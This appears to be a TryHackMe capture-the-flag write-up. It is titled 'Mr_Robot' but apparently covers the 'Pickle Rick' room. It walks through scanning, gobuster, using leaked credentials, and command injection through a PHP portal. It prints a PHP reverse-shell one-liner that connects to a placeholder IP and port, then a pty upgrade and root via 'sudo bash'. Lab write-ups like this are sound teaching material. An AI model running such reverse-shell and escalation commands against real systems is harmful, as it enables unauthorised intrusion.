# TryHackMe: Mr_Robot

---

By: *UnknownPerson*

---

nmap -sC -sV -Pn -vv {IP}

## Port Scanning: {22,80}
```plaintext

In the Main Website Source code we get Username :- R1ckRul3s

Let's do some directory Buster using :- 
> gobutster dir -u http://{ip} -w {Wordlist Location}

Throw Gobuster we get :- Wubbalubbadubdub
Let set This as password and Username we got alredy
```
Username :- R1ckRul3s
Password :- Wubbalubbadubdub
--

```
Than portal.php we login as Given credetial Than there
is Command Directory Where I think we can sent the command throw this

So lets Try input some Reverse Shell Contant 

We Try Almost Whole trick like by python bash nc also upload out 
php revreshell but did't work let last try with php 
because the page is in php also php command is not filter'd

```

php -r '$sock=fsockopen("<ip>",<port>);exec("sh <&3 >&3 2>&3");'
--

## Intial Access

```
We get Intial Shell Get bash shell by :-  python3 -c "import pty; pty.spawn('/bin/bash')"

We get 1'st and 2nd ingredients
```
## Privillage Escallation

```
As per rule let's check with SUID , Crontab , Config File , Sudo -l
 , SSH folder access At last Linpease

> Look This when we try sudo -l We have as www-data we have all 
permission to access let's get shell using given commmand
```
sudo bash
--

As this way we agin Pawned New machine {Pickle_Rick}
--